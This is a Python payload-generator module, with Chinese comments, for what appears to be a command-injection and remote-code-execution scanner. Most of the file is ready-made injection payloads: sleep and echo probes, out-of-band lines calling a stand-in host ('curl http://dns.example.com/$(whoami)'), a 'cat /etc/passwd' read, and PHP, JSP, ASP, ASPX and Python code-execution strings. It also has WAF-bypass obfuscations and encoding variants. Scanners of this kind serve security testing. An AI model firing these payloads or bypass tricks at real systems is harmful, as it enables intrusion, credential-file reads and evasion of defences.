"""
Payload生成器模块
"""

import base64
import urllib.parse
import random
import string
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum


class PayloadType(Enum):
    TIME_BASED = "time_based"
    ECHO_BASED = "echo_based"
    DNS_BASED = "dns_based"
    FILE_BASED = "file_based"
    CODE_EXEC = "code_exec"


class OSType(Enum):
    UNIX = "unix"
    WINDOWS = "windows"
    BOTH = "both"


class ScanMode(Enum):
    HARMLESS = "harmless"
    ECHO = "echo"
    WAF_BYPASS = "waf_bypass"


@dataclass
class Payload:
    content: str
    payload_type: PayloadType
    os_type: OSType
    description: str
    expected_delay: Optional[float] = None
    expected_output: Optional[str] = None
    encoded: bool = False
    is_harmless: bool = True


class PayloadGenerator:
    """Payload生成器"""
    
    def __init__(self):
        self.payloads: List[Payload] = []
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """加载默认payload库"""
        unix_time_payloads = [
            Payload("; sleep 5;", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 分号分隔", 5),
            Payload("| sleep 5 |", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 管道符", 5),
            Payload("&& sleep 5 &&", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - AND连接", 5),
            Payload("|| sleep 5 ||", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - OR连接", 5),
            Payload("`sleep 5`", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 反引号执行", 5),
            Payload("$(sleep 5)", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - $()执行", 5),
            Payload("\n sleep 5", PayloadType.TIME_BASED, OSType.UNIX, "Unix时间盲注 - 换行符", 5),
        ]
        
        windows_time_payloads = [
            Payload("& timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - &连接", 5),
            Payload("| timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - 管道符", 5),
            Payload("&& timeout 5", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - AND连接", 5),
            Payload("|| ping -n 5 127.0.0.1", PayloadType.TIME_BASED, OSType.WINDOWS, "Windows时间盲注 - ping延迟", 5),
        ]
        
        echo_payloads = [
            Payload("; echo 'RCE_TEST_MARKER_12345';", PayloadType.ECHO_BASED, OSType.UNIX, "Unix回显测试", expected_output="RCE_TEST_MARKER_12345"),
            Payload("| echo RCE_TEST_MARKER_12345 |", PayloadType.ECHO_BASED, OSType.UNIX, "Unix回显测试 - 管道符", expected_output="RCE_TEST_MARKER_12345"),
            Payload("& echo RCE_TEST_MARKER_12345", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows回显测试", expected_output="RCE_TEST_MARKER_12345"),
            Payload("| echo RCE_TEST_MARKER_12345", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows回显测试 - 管道符", expected_output="RCE_TEST_MARKER_12345"),
        ]
        
        dns_payloads = [
            Payload("; nslookup $(whoami).dns.example.com;", PayloadType.DNS_BASED, OSType.UNIX, "Unix DNS外带测试"),
            Payload("| nslookup %USERNAME%.dns.example.com", PayloadType.DNS_BASED, OSType.WINDOWS, "Windows DNS外带测试"),
            Payload("; curl http://dns.example.com/$(whoami);", PayloadType.DNS_BASED, OSType.UNIX, "Unix HTTP外带测试"),
        ]
        
        file_payloads = [
            Payload("; id > /tmp/rce_test.txt;", PayloadType.FILE_BASED, OSType.UNIX, "Unix文件写入测试"),
            Payload("& whoami > C:\\temp\\rce_test.txt", PayloadType.FILE_BASED, OSType.WINDOWS, "Windows文件写入测试"),
        ]
        
        self.payloads.extend(unix_time_payloads)
        self.payloads.extend(windows_time_payloads)
        self.payloads.extend(echo_payloads)
        self.payloads.extend(dns_payloads)
        self.payloads.extend(file_payloads)
    
    def get_payloads_by_type(self, payload_type: PayloadType) -> List[Payload]:
        """根据类型获取payload"""
        return [p for p in self.payloads if p.payload_type == payload_type]
    
    def get_payloads_by_os(self, os_type: OSType) -> List[Payload]:
        """根据操作系统获取payload"""
        return [p for p in self.payloads if p.os_type == os_type or p.os_type == OSType.BOTH]
    
    def get_time_based_payloads(self) -> List[Payload]:
        """获取时间盲注payload"""
        return self.get_payloads_by_type(PayloadType.TIME_BASED)
    
    def get_echo_based_payloads(self) -> List[Payload]:
        """获取回显型payload"""
        return self.get_payloads_by_type(PayloadType.ECHO_BASED)
    
    def get_dns_based_payloads(self) -> List[Payload]:
        """获取DNS外带payload"""
        return self.get_payloads_by_type(PayloadType.DNS_BASED)
    
    def url_encode(self, payload: Payload) -> Payload:
        """URL编码payload"""
        encoded_content = urllib.parse.quote(payload.content)
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (URL编码)",
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def base64_encode(self, payload: Payload) -> Payload:
        """Base64编码payload"""
        encoded_content = base64.b64encode(payload.content.encode()).decode()
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (Base64编码)",
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def double_url_encode(self, payload: Payload) -> Payload:
        """双重URL编码"""
        encoded_content = urllib.parse.quote(urllib.parse.quote(payload.content))
        return Payload(
            content=encoded_content,
            payload_type=payload.payload_type,
            os_type=payload.os_type,
            description=f"{payload.description} (双重URL编码)",
            expected_delay=payload.expected_delay,
            expected_output=payload.expected_output,
            encoded=True
        )
    
    def generate_variants(self, payload: Payload) -> List[Payload]:
        """生成payload变体"""
        variants = [payload]
        
        variants.append(self.url_encode(payload))
        variants.append(self.double_url_encode(payload))
        
        content_variants = [
            payload.content.replace(" ", "${IFS}"),
            payload.content.replace(" ", "%20"),
            payload.content.replace(" ", "$IFS"),
            payload.content.replace(";", "%3b"),
            payload.content.replace("|", "%7c"),
            payload.content.replace("&", "%26"),
        ]
        
        for i, content in enumerate(content_variants):
            if content != payload.content:
                variants.append(Payload(
                    content=content,
                    payload_type=payload.payload_type,
                    os_type=payload.os_type,
                    description=f"{payload.description} (变体{i+1})",
                    expected_delay=payload.expected_delay,
                    expected_output=payload.expected_output,
                    encoded=True
                ))
        
        return variants
    
    def add_custom_payload(self, content: str, payload_type: PayloadType, 
                          os_type: OSType, description: str,
                          expected_delay: Optional[float] = None,
                          expected_output: Optional[str] = None):
        """添加自定义payload"""
        self.payloads.append(Payload(
            content=content,
            payload_type=payload_type,
            os_type=os_type,
            description=description,
            expected_delay=expected_delay,
            expected_output=expected_output
        ))
    
    def get_all_payloads(self) -> List[Payload]:
        """获取所有payload"""
        return self.payloads.copy()
    
    def get_harmless_payloads(self) -> List[Payload]:
        """获取无害化payload（时间盲注类型）"""
        return self.get_time_based_payloads()
    
    def get_echo_payloads(self) -> List[Payload]:
        """获取有回显的payload（ls, whoami等）"""
        echo_payloads = []
        
        unix_echo = [
            Payload("; ls;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 列出当前目录", expected_output="", is_harmless=False),
            Payload("; ls -la;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 列出详细信息", expected_output="total", is_harmless=False),
            Payload("; whoami;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示当前用户", expected_output="", is_harmless=False),
            Payload("; id;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示用户ID", expected_output="uid=", is_harmless=False),
            Payload("; pwd;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 显示当前路径", expected_output="/", is_harmless=False),
            Payload("; uname -a;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 系统信息", expected_output="Linux", is_harmless=False),
            Payload("; cat /etc/passwd;", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 读取passwd", expected_output="root:", is_harmless=False),
            Payload("| ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 管道符ls", expected_output="", is_harmless=False),
            Payload("| whoami", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 管道符whoami", expected_output="", is_harmless=False),
            Payload("&& ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - AND连接ls", expected_output="", is_harmless=False),
            Payload("|| ls", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - OR连接ls", expected_output="", is_harmless=False),
            Payload("`ls`", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - 反引号ls", expected_output="", is_harmless=False),
            Payload("$(ls)", PayloadType.ECHO_BASED, OSType.UNIX, "Unix - $()执行ls", expected_output="", is_harmless=False),
        ]
        
        windows_echo = [
            Payload("& dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 列出目录", expected_output="", is_harmless=False),
            Payload("& whoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 当前用户", expected_output="", is_harmless=False),
            Payload("& type %COMSPEC%", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 读取文件", expected_output="", is_harmless=False),
            Payload("| dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 管道符dir", expected_output="", is_harmless=False),
            Payload("| whoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - 管道符whoami", expected_output="", is_harmless=False),
            Payload("&& dir", PayloadType.ECHO_BASED, OSType.WINDOWS, "Windows - AND连接dir", expected_output="", is_harmless=False),
        ]
        
        php_code_exec = [
            Payload("system('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system()函数", expected_output="", is_harmless=False),
            Payload("system('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - whoami", expected_output="", is_harmless=False),
            Payload("system('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - id", expected_output="uid=", is_harmless=False),
            Payload("exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP exec()函数", expected_output="", is_harmless=False),
            Payload("exec('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP exec() - whoami", expected_output="", is_harmless=False),
            Payload("shell_exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP shell_exec()函数", expected_output="", is_harmless=False),
            Payload("shell_exec('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP shell_exec() - whoami", expected_output="", is_harmless=False),
            Payload("passthru('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru()函数", expected_output="", is_harmless=False),
            Payload("passthru('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru() - whoami", expected_output="", is_harmless=False),
            Payload("passthru('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru() - id", expected_output="uid=", is_harmless=False),
            Payload("`ls`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号执行", expected_output="", is_harmless=False),
            Payload("`whoami`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号 - whoami", expected_output="", is_harmless=False),
            Payload("popen('ls','r');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP popen()函数", expected_output="", is_harmless=False),
            Payload("proc_open('ls',[],$pipes);", PayloadType.CODE_EXEC, OSType.BOTH, "PHP proc_open()函数", expected_output="", is_harmless=False),
            Payload("pcntl_exec('/bin/sh',['-c','ls']);", PayloadType.CODE_EXEC, OSType.BOTH, "PHP pcntl_exec()函数", expected_output="", is_harmless=False),
        ]
        
        jsp_code_exec = [
            Payload("<%Runtime.getRuntime().exec(\"ls\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec()", expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"whoami\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - whoami", expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"id\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - id", expected_output="", is_harmless=False),
            Payload("<%=Runtime.getRuntime().exec(\"ls\")%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP表达式执行", expected_output="", is_harmless=False),
            Payload("<%new java.lang.ProcessBuilder(\"ls\").start();%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP ProcessBuilder", expected_output="", is_harmless=False),
            Payload("<%new java.lang.ProcessBuilder(\"whoami\").start();%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP ProcessBuilder - whoami", expected_output="", is_harmless=False),
            Payload("#{Runtime.getRuntime().exec('ls')}", PayloadType.CODE_EXEC, OSType.BOTH, "EL表达式执行", expected_output="", is_harmless=False),
            Payload("#{Runtime.getRuntime().exec('whoami')}", PayloadType.CODE_EXEC, OSType.BOTH, "EL表达式 - whoami", expected_output="", is_harmless=False),
        ]
        
        asp_code_exec = [
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell", expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c whoami\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell - whoami", expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%Response.Write(shell.Exec(\"cmd /c dir\").StdOut.ReadAll)%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP Exec读取输出", expected_output="", is_harmless=False),
        ]
        
        aspx_code_exec = [
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start", expected_output="", is_harmless=False),
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start - whoami", expected_output="", is_harmless=False),
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "ASPX Process.Start - id", expected_output="", is_harmless=False),
            Payload("<%=System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX表达式执行", expected_output="", is_harmless=False),
        ]
        
        python_code_exec = [
            Payload("__import__('os').system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ os.system", expected_output="", is_harmless=False),
            Payload("__import__('os').system('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ - whoami", expected_output="", is_harmless=False),
            Payload("__import__('os').popen('ls').read()", PayloadType.CODE_EXEC, OSType.BOTH, "Python os.popen", expected_output="", is_harmless=False),
            Payload("__import__('subprocess').check_output('ls',shell=True)", PayloadType.CODE_EXEC, OSType.BOTH, "Python subprocess", expected_output="", is_harmless=False),
            Payload("eval('__import__(\"os\").system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Python eval执行", expected_output="", is_harmless=False),
            Payload("exec('__import__(\"os\").system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Python exec执行", expected_output="", is_harmless=False),
        ]
        
        echo_payloads.extend(unix_echo)
        echo_payloads.extend(windows_echo)
        echo_payloads.extend(php_code_exec)
        echo_payloads.extend(jsp_code_exec)
        echo_payloads.extend(asp_code_exec)
        echo_payloads.extend(aspx_code_exec)
        echo_payloads.extend(python_code_exec)
        
        return echo_payloads
    
    def get_waf_bypass_payloads(self) -> List[Payload]:
        """获取WAF绕过payload"""
        bypass_payloads = []
        
        unix_bypass = [
            Payload("; l''s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 引号分割", expected_output="", is_harmless=False),
            Payload("; l\\s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 反斜杠", expected_output="", is_harmless=False),
            Payload("; l$@s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 特殊字符", expected_output="", is_harmless=False),
            Payload("; l$()s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 空命令替换", expected_output="", is_harmless=False),
            Payload("; {ls,};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 大括号扩展", expected_output="", is_harmless=False),
            Payload("; l${PATH:0:0}s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 变量切片", expected_output="", is_harmless=False),
            Payload("; l${IFS}s;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS变量", expected_output="", is_harmless=False),
            Payload(";$(printf'\\x6c\\x73');", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - printf十六进制", expected_output="", is_harmless=False),
            Payload(";$(echo'bHM='|base64-d);", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - base64解码", expected_output="", is_harmless=False),
            Payload("; w${PATH:0:0}hoami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami变量切片", expected_output="", is_harmless=False),
            Payload("; {whoami,};", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami大括号", expected_output="", is_harmless=False),
            Payload("; wh\\oami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami反斜杠", expected_output="", is_harmless=False),
            Payload("; wh''oami;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami引号", expected_output="", is_harmless=False),
            Payload("%0als", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - 换行符URL编码", expected_output="", is_harmless=False),
            Payload("%0awhoami", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - whoami换行编码", expected_output="", is_harmless=False),
            Payload(";${IFS}ls${IFS}-la;", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS空格替换", expected_output="total", is_harmless=False),
            Payload(";$IFS'ls';", PayloadType.ECHO_BASED, OSType.UNIX, "WAF绕过 - IFS加引号", expected_output="", is_harmless=False),
        ]
        
        windows_bypass = [
            Payload("& d^ir", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - Windows脱字符", expected_output="", is_harmless=False),
            Payload("& w^hoami", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - whoami脱字符", expected_output="", is_harmless=False),
            Payload("& di''r", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - Windows引号", expected_output="", is_harmless=False),
            Payload("& who''ami", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - whoami引号", expected_output="", is_harmless=False),
            Payload("& set /a=dir&call %a%", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - 变量调用", expected_output="", is_harmless=False),
            Payload("& for /f \"delims=\" %a in ('cmd /c echo dir') do %a", PayloadType.ECHO_BASED, OSType.WINDOWS, "WAF绕过 - for循环", expected_output="", is_harmless=False),
        ]
        
        bypass_payloads.extend(unix_bypass)
        bypass_payloads.extend(windows_bypass)
        
        return bypass_payloads
    
    def get_payloads_by_mode(self, mode: ScanMode) -> List[Payload]:
        """根据扫描模式获取payload"""
        if mode == ScanMode.HARMLESS:
            return self.get_harmless_payloads()
        elif mode == ScanMode.ECHO:
            return self.get_echo_payloads()
        elif mode == ScanMode.WAF_BYPASS:
            return self.get_waf_bypass_payloads()
        return self.get_all_payloads()
    
    def get_payloads_by_url(self, url: str, mode: ScanMode = ScanMode.ECHO) -> List[Payload]:
        """根据URL后缀获取对应语言的payload"""
        url_lower = url.lower()
        
        php_payloads = self._get_php_payloads(mode)
        jsp_payloads = self._get_jsp_payloads(mode)
        asp_payloads = self._get_asp_payloads(mode)
        aspx_payloads = self._get_aspx_payloads(mode)
        python_payloads = self._get_python_payloads(mode)
        
        if any(ext in url_lower for ext in ['.php', '.php3', '.php4', '.php5', '.phtml']):
            return php_payloads
        elif any(ext in url_lower for ext in ['.jsp', '.jspx', '.jspa', '.jsw', '.jsv']):
            return jsp_payloads
        elif any(ext in url_lower for ext in ['.asp']):
            return asp_payloads
        elif any(ext in url_lower for ext in ['.aspx', '.ashx', '.asmx', '.asax']):
            return aspx_payloads
        elif any(ext in url_lower for ext in ['.py', '.cgi', '.fcgi']):
            return python_payloads
        
        all_payloads = []
        all_payloads.extend(php_payloads)
        all_payloads.extend(jsp_payloads)
        all_payloads.extend(asp_payloads)
        all_payloads.extend(aspx_payloads)
        all_payloads.extend(python_payloads)
        all_payloads.extend(self.get_echo_payloads())
        
        seen = set()
        unique_payloads = []
        for p in all_payloads:
            if p.content not in seen:
                seen.add(p.content)
                unique_payloads.append(p)
        
        return unique_payloads
    
    def _get_php_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取PHP代码执行payload"""
        payloads = [
            Payload("system('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system()函数", expected_output="", is_harmless=False),
            Payload("system('whoami');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - whoami", expected_output="", is_harmless=False),
            Payload("system('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP system() - id", expected_output="uid=", is_harmless=False),
            Payload("exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP exec()函数", expected_output="", is_harmless=False),
            Payload("shell_exec('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP shell_exec()函数", expected_output="", is_harmless=False),
            Payload("passthru('ls');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru()函数", expected_output="", is_harmless=False),
            Payload("passthru('id');", PayloadType.CODE_EXEC, OSType.BOTH, "PHP passthru() - id", expected_output="uid=", is_harmless=False),
            Payload("`ls`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号执行", expected_output="", is_harmless=False),
            Payload("`id`", PayloadType.CODE_EXEC, OSType.BOTH, "PHP反引号 - id", expected_output="uid=", is_harmless=False),
        ]
        return payloads
    
    def _get_jsp_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取JSP代码执行payload"""
        payloads = [
            Payload("<%Runtime.getRuntime().exec(\"ls\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec()", expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"whoami\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - whoami", expected_output="", is_harmless=False),
            Payload("<%Runtime.getRuntime().exec(\"id\");%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP Runtime.exec() - id", expected_output="", is_harmless=False),
            Payload("<%=Runtime.getRuntime().exec(\"ls\")%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP表达式执行", expected_output="", is_harmless=False),
            Payload("<%new java.lang.ProcessBuilder(\"ls\").start();%>", PayloadType.CODE_EXEC, OSType.BOTH, "JSP ProcessBuilder", expected_output="", is_harmless=False),
            Payload("#{Runtime.getRuntime().exec('ls')}", PayloadType.CODE_EXEC, OSType.BOTH, "EL表达式执行", expected_output="", is_harmless=False),
        ]
        return payloads
    
    def _get_asp_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取ASP代码执行payload"""
        payloads = [
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell", expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%shell.Run(\"cmd /c whoami\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP WScript.Shell - whoami", expected_output="", is_harmless=False),
            Payload("<%Set shell=Server.CreateObject(\"WScript.Shell\")%><%Response.Write(shell.Exec(\"cmd /c dir\").StdOut.ReadAll)%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASP Exec读取输出", expected_output="", is_harmless=False),
        ]
        return payloads
    
    def _get_aspx_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取ASPX代码执行payload"""
        payloads = [
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start", expected_output="", is_harmless=False),
            Payload("<%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\");%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX Process.Start - whoami", expected_output="", is_harmless=False),
            Payload("<%=System.Diagnostics.Process.Start(\"cmd.exe\",\"/c dir\")%>", PayloadType.CODE_EXEC, OSType.WINDOWS, "ASPX表达式执行", expected_output="", is_harmless=False),
        ]
        return payloads
    
    def _get_python_payloads(self, mode: ScanMode) -> List[Payload]:
        """获取Python代码执行payload"""
        payloads = [
            Payload("__import__('os').system('ls')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ os.system", expected_output="", is_harmless=False),
            Payload("__import__('os').system('whoami')", PayloadType.CODE_EXEC, OSType.BOTH, "Python __import__ - whoami", expected_output="", is_harmless=False),
            Payload("__import__('os').popen('ls').read()", PayloadType.CODE_EXEC, OSType.BOTH, "Python os.popen", expected_output="", is_harmless=False),
            Payload("__import__('subprocess').check_output('ls',shell=True)", PayloadType.CODE_EXEC, OSType.BOTH, "Python subprocess", expected_output="", is_harmless=False),
            Payload("eval('__import__(\"os\").system(\"ls\")')", PayloadType.CODE_EXEC, OSType.BOTH, "Python eval执行", expected_output="", is_harmless=False),
        ]
        return payloads
